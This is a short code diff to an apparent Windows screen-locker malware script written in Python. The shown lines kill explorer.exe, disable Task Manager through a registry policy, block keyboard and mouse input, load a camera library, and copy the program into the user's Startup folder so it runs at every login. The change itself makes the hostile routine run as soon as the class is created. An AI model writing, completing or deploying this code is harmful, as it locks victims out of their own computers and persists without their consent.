@@ -6,7 +6,7 @@ from ctypes import *
 filename=sys.argv[0]
 file1=r"C:\Users\{0}\AppData\Roaming\Microsoft\Windows\{1}\Programs\Startup".format(os.getlogin(),'Start Menu')
 class main:
-    def start(self):
+    def __init__(self):
         os.system('taskkill /f /im explorer.exe & REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f')
         ok = windll.user32.BlockInput(True)
         import cv2
@@ -30,8 +30,8 @@ if os.getcwd()!=file1 :
         read=f.read()
         with open(file1+r'\suoji.exe','wb') as f2:
             f2.write(read)        
-    main().start()       
+    main()  
 else:
-    main().start()
+    main()
 
 
